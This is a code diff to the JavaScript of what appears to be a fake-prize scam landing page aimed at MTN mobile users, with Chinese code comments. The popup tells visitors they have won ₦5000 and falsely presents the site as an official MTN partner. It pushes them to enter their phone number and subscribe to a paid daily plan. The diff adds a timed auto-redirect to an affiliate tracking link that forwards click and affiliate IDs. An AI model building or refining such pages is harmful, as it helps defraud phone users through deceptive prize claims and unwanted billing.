@@ -741,7 +741,7 @@
             icon: 'success',
             iconHtml: '<svg width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="10" fill="url(#successGrad)" stroke="#ff6b35" stroke-width="2"/><path d="M8 12l2 2 4-6" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/><defs><linearGradient id="successGrad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#ffcc00;stop-opacity:1"/><stop offset="100%" style="stop-color:#ff6b35;stop-opacity:1"/></linearGradient></defs></svg>',
             title: 'Match Found! Prize Reserved.',
-            html: '<div style="text-align: center;"><h3 style="color: #000;">MATCH FOUND!</h3><p>You have matched the winning items!</p><div style="background: #fff3cd; padding: 10px; border-radius: 8px; border: 1px dashed #ffcc00; margin: 10px 0;"><strong>YOUR PRIZE: ₦5000 Cash/Airtime</strong><br><span style="color: #dc3545; font-size: 0.9em;">Status: Pending Activation</span></div><p><strong>Final Step to Claim:</strong></p><ol style="text-align: left; margin: 0 auto; display: inline-block;"><li>Click <strong>"CLAIM NOW"</strong> below.</li><li>Enter your MTN number on the next page.</li><li>Subscribe to the <strong>N100 Daily Plan</strong> to unlock your prize wallet!</li></ol><br><strong><span id="countdown">' + countdownSeconds + '</span> seconds until auto-redirect...</strong><br><small style="color:#666;">• Secure MTN official partner website<br>• Enter your MTN number to activate daily plan<br><br><button id="cancelRedirect" style="background-color: #6c757d; color: white; border: none; padding: 8px 16px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top:10px;">Cancel Redirect</button></div>',
+            html: '<div style="text-align: center;"><h3 style="color: #000;">MATCH FOUND!</h3><p>You have matched the winning items!</p><div style="background: #fff3cd; padding: 10px; border-radius: 8px; border: 1px dashed #ffcc00; margin: 10px 0;"><strong>YOUR PRIZE: ₦5000 Cash/Airtime</strong><br><span style="color: #dc3545; font-size: 0.9em;">Status: Pending Activation</span></div><p><strong>Next Steps:</strong></p><ol style="text-align: left; margin: 0 auto; display: inline-block;"><li>You will be <strong>automatically redirected</strong> in <span id="countdown">' + countdownSeconds + '</span> seconds.</li><li>Enter your MTN number on the next page.</li><li>Subscribe to the <strong>N100 Daily Plan</strong> to unlock your prize wallet!</li></ol><br><strong style="color: #28a745; font-size: 1.1em;">Auto-redirecting in <span id="countdown">' + countdownSeconds + '</span> seconds...</strong><br><small style="color:#666;">• Secure MTN official partner website<br>• Automatic redirect for seamless experience<br><br><button id="cancelRedirect" style="background-color: #6c757d; color: white; border: none; padding: 8px 16px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top:10px;">Cancel Auto-Redirect</button></div>',
             showConfirmButton: false,
             allowOutsideClick: false,
             timer: countdownSeconds * 1000,
@@ -777,9 +777,48 @@
 
         swalWithTimer.fire().then((result) => {
             if (result.dismiss === Swal.DismissReason.timer) {
-                window.location.href = 'https://84ql3.bemobtrcks.com/click';
+                // 获取当前页面的 URL 参数
+                const urlParams = new URLSearchParams(window.location.search);
+
+                // 构建 BeMob 点击 URL，包含必要的参数
+                const bemobClickUrl = new URL('https://84ql3.bemobtrcks.com/click');
+
+                // 传递原有参数到 BeMob
+                if (urlParams.has('clickid')) {
+                    bemobClickUrl.searchParams.set('clickid', urlParams.get('clickid'));
+                }
+                if (urlParams.has('aff_sub')) {
+                    bemobClickUrl.searchParams.set('aff_sub', urlParams.get('aff_sub'));
+                }
+                if (urlParams.has('aff_sub2')) {
+                    bemobClickUrl.searchParams.set('aff_sub2', urlParams.get('aff_sub2'));
+                }
+
+                window.location.href = bemobClickUrl.toString();
             }
         });
+    }
+
+    // 处理手动点击 BeMob 链接
+    function handleManualClick() {
+        // 获取当前页面的 URL 参数
+        const urlParams = new URLSearchParams(window.location.search);
+
+        // 构建 BeMob 点击 URL，包含必要的参数
+        const bemobClickUrl = new URL('https://84ql3.bemobtrcks.com/click');
+
+        // 传递原有参数到 BeMob
+        if (urlParams.has('clickid')) {
+            bemobClickUrl.searchParams.set('clickid', urlParams.get('clickid'));
+        }
+        if (urlParams.has('aff_sub')) {
+            bemobClickUrl.searchParams.set('aff_sub', urlParams.get('aff_sub'));
+        }
+        if (urlParams.has('aff_sub2')) {
+            bemobClickUrl.searchParams.set('aff_sub2', urlParams.get('aff_sub2'));
+        }
+
+        window.location.href = bemobClickUrl.toString();
     }
 
     // 手动确认版本
@@ -790,7 +829,7 @@
             html: '<div style="text-align: center;"><h3 style="color: #000;">MATCH FOUND!</h3><p>You have matched the winning items!</p><div style="background: #fff3cd; padding: 10px; border-radius: 8px; border: 1px dashed #ffcc00; margin: 10px 0;"><strong>YOUR PRIZE: ₦5000 Cash/Airtime</strong><br><span style="color: #dc3545; font-size: 0.9em;">Status: Pending Activation</span></div><p><strong>Final Step to Claim:</strong></p><ol style="text-align: left; margin: 0 auto; display: inline-block;"><li>Click <strong>"CLAIM NOW"</strong> below.</li><li>Enter your MTN number on the next page.</li><li>Subscribe to the <strong>N100 Daily Plan</strong> to unlock your prize wallet!</li></ol><br><small style="color:#666;">• Official MTN Partner Site<br>• N100 Daily Plan activation required</small></div>',
             showConfirmButton: false,
             allowOutsideClick: false,
-            footer: '<button onclick="window.location.href = \'https://84ql3.bemobtrcks.com/click\';" style="text-decoration: none; display: block; padding: 10px 20px; background-color: #ffcc00; color: black; font-weight: bold; border-radius: 5px; cursor: pointer; border: none; width: 100%;">CLAIM NOW ➤</button>'
+            footer: '<button onclick="handleManualClick()" style="text-decoration: none; display: block; padding: 10px 20px; background-color: #ffcc00; color: black; font-weight: bold; border-radius: 5px; cursor: pointer; border: none; width: 100%;">CLAIM NOW ➤</button>'
         });
     }
 
